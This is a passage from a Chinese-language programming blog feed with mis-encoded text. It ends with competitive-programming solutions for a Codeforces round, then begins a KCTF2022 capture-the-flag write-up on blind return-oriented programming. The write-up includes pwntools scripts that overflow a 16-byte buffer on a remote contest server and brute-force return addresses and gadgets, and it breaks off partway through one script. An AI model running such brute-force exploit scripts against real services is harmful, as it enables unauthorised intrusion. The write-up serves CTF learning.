class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int a[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//    scanf(&quot;%d%d&quot;,&amp;a,&amp;b);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> A &amp;q)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a==q.a)&#123;</span><br><span class="line">            <span class="keyword">return</span> b&lt;q.b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a&lt;q.a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;a[maxn]; </span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;().<span class="built_in">swap</span>(ans);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i].b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> idx=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[j]&lt;a[idx])&#123;</span><br><span class="line">                idx=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(idx!=i)&#123;</span><br><span class="line">            ans.<span class="built_in">push</span>(&#123;idx,i&#125;);</span><br><span class="line">            <span class="built_in">swap</span>(a[i],a[idx]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i<span class="number">-1</span>].b&gt;a[i].b)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans.<span class="built_in">size</span>());</span><br><span class="line">    <span class="keyword">while</span>(ans.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=ans.<span class="built_in">front</span>();</span><br><span class="line">        ans.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,x.first,x.second);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Colorful-Stamp"><a href="#D-Colorful-Stamp" class="headerlink" title="D. Colorful Stamp"></a>D. Colorful Stamp</h2><h3 id="é¢˜ç›®æè¿°-3"><a href="#é¢˜ç›®æè¿°-3" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-3"><a href="#é¢˜ç›®åˆ†æ-3" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ï¼Œå°±æ˜¯è¯´å¯¹ä¸€ä¸ªæ•°è¿›è¡Œæ“ä½œï¼Œæ¯æ¬¡å¯ä»¥æŠŠè¿™ä¸ªæ•°çš„åè¿›åˆ¶æŸä¸€ä½ä½œä¸ºä¹˜æ•°ä¹˜è¿™ä¸ªæ•°ï¼Œå³ä¸ºä¸€æ¬¡æ“ä½œã€‚é—®ä½ æœ€å°æ“ä½œæ¬¡æ•°ä½¿è¿™ä¸ªæ•°å˜æˆåè¿›åˆ¶ <code>n</code> ä½ã€‚</p><p>è¿™ä¸ªé¢˜çš„è¯å°±ç›´æ¥æ— è„‘å¹¿æœå°±å¥½äº†ã€‚</p><h3 id="æ ‡ç¨‹-3"><a href="#æ ‡ç¨‹-3" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int unsigned long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> target=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">40</span>;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;</span><br><span class="line">map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;ma;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(&#123;now,<span class="number">0</span>&#125;);</span><br><span class="line">    <span class="keyword">bool</span> used[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        <span class="built_in">memset</span>(used,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(used));</span><br><span class="line">        <span class="keyword">int</span> num=q.<span class="built_in">front</span>().first;</span><br><span class="line">        <span class="keyword">int</span> step=q.<span class="built_in">front</span>().second;</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> m=num;</span><br><span class="line">        <span class="keyword">if</span>(num&gt;=target)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;%lld\n&quot;,cnt);</span></span><br><span class="line">            <span class="keyword">return</span> step;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(m)&#123;</span><br><span class="line">            <span class="keyword">int</span> p=m%<span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="number">0</span>&amp;&amp;p!=<span class="number">1</span>&amp;&amp;!used[p])&#123;</span><br><span class="line">                used[p]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(ma[p*num]==<span class="number">1</span>)<span class="keyword">continue</span>;</span><br><span class="line">                ma[p*num]=<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(&#123;p*num,step+<span class="number">1</span>&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            m/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    target=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        target*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">bfs</span>(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-The-End"><a href="#In-The-End" class="headerlink" title="In The End"></a>In The End</h2><p>è¿™æ³¢åº”è¯¥æ˜¯æ‰‹é€Ÿåœºï¼Œæ‰‹é€Ÿå¿«å°±æ˜¯ä¸Šå¤§åˆ†ï¼Œç»§ä¸Šä¸€æ¬¡ç½šæ—¶çˆ†ç‚¸ä¹‹åè¿™åœºæ²¡æœ‰ä¸€ç‚¹ç½šæ—¶ï¼ŒæŒºå¥½çš„ï¼Œåˆšåˆšæ‰è“ä¸€ä¸‹ç»™åŠ å›æ¥äº†ã€‚</p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/5.png" alt="5"></p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/6.png" alt="6"></p><p>100åˆ†ï¼</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> é¢˜è§£ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF2022æ˜¥å­£èµ› ç¬¬å…­é¢˜ writeup</title>
      <link href="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/"/>
      <url>/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/</url>
      
        <content type="html"><![CDATA[<p>KCTF2022æ˜¥å­£èµ› ç¬¬å…­é¢˜ writeup</p><span id="more"></span><p>è¿™é¢˜ï¼ŒBROPæç¤ºç»™çš„å¾ˆæ˜æ˜¾ï¼Œæ‰€ä»¥å°±æ˜¯ç›²æ‰“ï¼Œä¸ç®¡æ€ä¹ˆè¯´å…ˆé—®(bao)å€™(da)ä¸€ä¸‹å‡ºé¢˜äººã€‚</p><p>é¦–å…ˆæˆ‘ä»¬ä¸€å¼€å§‹ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Œå°±å…ˆç¡®å®šä¸€ä¸‹ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å…ˆæµ‹è¯•ä¸€ä¸‹ç¼“å†²åŒºçš„é•¿åº¦ï¼Œæœ€åå‘ç°ç¼“å†²åŒºé•¿åº¦ä¸º0x10ã€‚</p><p>æˆ‘ä»¬å…ˆæ‰§è¡Œä¸€éæ­£å¸¸æµç¨‹ï¼Œå¤§æ¦‚å°±æ˜¯ï¼š</p><ol><li>è¾“å‡ºä¸€å¥è¯</li><li>è¾“å…¥</li><li>è¾“å‡ºä¸€å¥è¯</li></ol><p>å½“å­˜åœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œæœ€åä¸€å¥è¯è¾“å‡ºä¸å‡ºæ¥ï¼Œå› æ­¤å¯ä»¥æ–­å®šï¼Œæº¢å‡ºæ˜¯å‘ç”Ÿåœ¨è‡ªå·±å®šä¹‰çš„å‡½æ•°çš„ã€‚å¤§æ¦‚å†™ä¸€ä¸‹ä¼ªä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void func()&#123;</span><br><span class="line">char buf[16];</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">puts(&quot;hacker, TNT!&quot;);</span><br><span class="line">func();</span><br><span class="line">puts(&quot;TNT TNT!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œè¾“å‡ºç¬¬ä¸€å¥è¯çš„è¯­å¥å¯èƒ½ä¹Ÿåœ¨ <code>func</code> é‡Œé¢ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œæˆ‘ä»¬å…ˆçˆ†ç ´ç¬¬ä¸€ä¸ªå­—èŠ‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p8(i)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/1.png" alt="1"></p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/2.png" alt="2"></p><p>å¯ä»¥å‘ç°ï¼Œå½“è¦†ç›–ä¸€ä¸ª <code>\xb0</code> å­—èŠ‚çš„æ—¶å€™ï¼Œç¨‹åºé‡æ–°æ‰§è¡Œäº†ä¸€é <code>main</code> å‡½æ•°ï¼Œå½“è¦†ç›–ä¸€ä¸ª <code>\xce</code> å­—èŠ‚çš„æ—¶å€™ï¼Œç¨‹åºæ‰§è¡Œæ­£å¸¸æµç¨‹é€€å‡ºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾—å‡ºä»¥ä¸‹ä¿¡æ¯ï¼š</p><ul><li><code>main</code> å‡½æ•°çš„ä½ä½ä¸º <code>0xb0</code></li><li><code>func</code> å‡½æ•°çš„è¿”å›åœ°å€ä¸º <code>0xce</code></li></ul><p>è¿™é‡Œå…¶å®å¯ä»¥ç¡®å®šè¾“å‡ºç¬¬ä¸€å¥è¯çš„å‡½æ•°åœ¨ <code>main</code> å½“ä¸­äº†ï¼Œå› ä¸ºå¦‚æœåœ¨ <code>func</code> å‡½æ•°å½“ä¸­ï¼Œé‚£ä¹ˆä¸€å®šä¼šå­˜åœ¨ä¸¤ä¸ªåœ°å€ä½¿å¾—ç¨‹åºé‡æ–°æ‰§è¡Œä¸€éæµç¨‹ï¼Œé‚£å°±æ˜¯æ”¹æˆäº† <code>func</code> å‡½æ•°å’Œ <code>main</code> å‡½æ•°çš„åœ°å€éƒ½ä¼šè¿™æ ·ï¼Œæ²¡æœ‰å°±è¯´æ˜ç¬¬ä¸€å¥è¯è¾“å‡ºä¸åœ¨ <code>main</code> å½“ä¸­ã€‚</p><p>ç„¶åå†å‹‡æ•¢åœ°ä¸€è¯•ï¼ŒçŒœæµ‹å®ƒçš„åœ°å€ä¸º <code>0x4000b0</code>ï¼Œç»“æœå‘ç°ä¹Ÿæ˜¯é‡æ–°æ‰§è¡Œäº† <code>main</code> å‡½æ•°ï¼Œè¿™ä¹Ÿé—´æ¥æ–­å®šäº†è¿™ä¸ªç¨‹åºæ˜¯ <code>64</code> ä½çš„ã€‚ä¸Šé¢æ¨å‡ºçš„ä¸¤ä¸ªåœ°å€ä¹Ÿç¡®å®šäº†ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥å°è¯•å–å¯»æ‰¾ <code>gadget</code> äº†ï¼Œæˆ‘ä»¬è¦å¯»æ‰¾çš„é¦–è¦ <code>gadget</code> è‡ªç„¶å°±æ˜¯ <code>pop rdi ret</code> äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b0</span></span><br><span class="line">ret=<span class="number">0x4000ce</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x401900</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(ret)+p64(main)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ª <code>payload</code> å½“ä¸­ï¼Œå¯ä»¥å‘ç°ï¼Œå¦‚æœå¯»æ‰¾çš„ <code>gadget</code> ä¸º <code>ret</code>ï¼Œé‚£ä¹ˆåˆ™ä¼šç»§ç»­æµç¨‹ï¼Œå¦‚æœ <code>gadget</code> ç±»ä¼¼äº <code>pop xxx ret</code> çš„è¯åˆ™ä¼šé‡æ–°æ‰§è¡Œ <code>main</code> å‡½æ•°ã€‚ç»“æœ <code>ret</code> æ‰¾åˆ°äº†å¾ˆå¤šï¼Œå…¶å®ƒçš„ <code>gadget</code> æ„£æ˜¯æ²¡æ‰¾åˆ°ä¸€ä¸ªï¼Œäºæ˜¯å†³å®šå¾€åé¢å†åŠ ä¸€ä¸ª <code>p64(main)</code>ï¼Œç»“æœå±…ç„¶æ‰¾åˆ°äº†ä¸ƒä¸ªåœ°å€ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a0x4000f5 pop xxx *2;ret</span><br><span class="line">0x4000fa pop xxx *2;ret</span><br><span class="line">0x4000fb pop xxx *2;ret</span><br><span class="line">0x4000fd pop xxx *2;ret</span><br><span class="line">0x4000fe pop xxx *2;ret</span><br><span class="line">0x400100 pop xxx *2;ret</span><br><span class="line">0x400101 ret</span><br><span class="line">0x400102 pop xxx *2 ; ret</span><br><span class="line">0x400106 ret</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘å°è¯•å–å¯»æ‰¾å®ƒçš„ <code>IO</code> å‡½æ•°å»è¾“å‡ºå®ƒçš„ <code>got</code> è¡¨ï¼Œä½†æ˜¯æµ‹äº†å¾ˆå¤šåœ°å€éƒ½æ²¡æœ‰å‘ç°æœ‰è¾“å‡º <code>\n</code> å­—èŠ‚ï¼Œè¿™é‡Œä¹Ÿæ’é™¤å®ƒç”¨ <code>puts</code> å‡½æ•°è¾“å‡ºçš„å¯èƒ½ï¼Œä½†æ˜¯å®ƒå¯èƒ½ä¹Ÿç”¨äº† <code>printf</code> æˆ–è€…æ˜¯ <code>write</code> å‡½æ•°ä¹‹ç±»çš„ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯å¾€ <code>printf</code> å»æƒ³è€Œæ²¡æœ‰å¾€ <code>write</code> å»æƒ³ã€‚ç„¶åæˆ‘å°±æ‹¿é‚£äº› <code>gadget</code> è¯•ç€ä¼ å‚çœ‹çœ‹ï¼Œç»“æœä¸å‡ºæ„å¤–éƒ½å¤±è´¥äº†ï¼Œæ— ä»»ä½•å›æ˜¾ã€‚</p><p>è¿™é‡Œæˆ‘å›°æ‰°äº†å¾ˆä¹…ï¼Œåæ¥æˆ‘ä»¬é˜Ÿçš„ <code>ThTsOd</code> å¸ˆå‚…ç»™äº†æˆ‘ä¸€ä¸ªå¾ˆé‡è¦çš„æ€è·¯ï¼Œé‚£å°±æ˜¯</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/3.png" alt="3"></p><p>å†æ¥çœ‹çœ‹ç²¾è‡´å¾—åˆ†çš„è§„åˆ™ï¼š</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/4.png" alt="4"></p><p>ç›´æ¥æ‹‰æ»¡äº†é‚£å°±å¾ˆèƒ½è¯´æ˜é—®é¢˜äº†ï¼Œè‚¯å®šæ˜¯ç”šè‡³æ²¡æœ‰ <code>plt</code> æˆ–è€… <code>got</code> è¡¨çš„é‚£ç§æ–‡ä»¶ï¼Œç›´æ¥ç”¨çš„ <code>syscall</code> æ‰èƒ½æœ‰è¿™ä¹ˆå°çš„é•¿åº¦ã€‚</p><p>è¿™é‡Œå€Ÿç”¨ä»¥ä¸‹ <code>ThTsOd</code> å¸ˆå‚…çš„è„šæœ¬ï¼Œå¸®æˆ‘ä»¬ç¡®å®šäº†ä¸€äº› <code>syscall</code> çš„ä½ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;warn&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x400120</span>):</span><br><span class="line">        <span 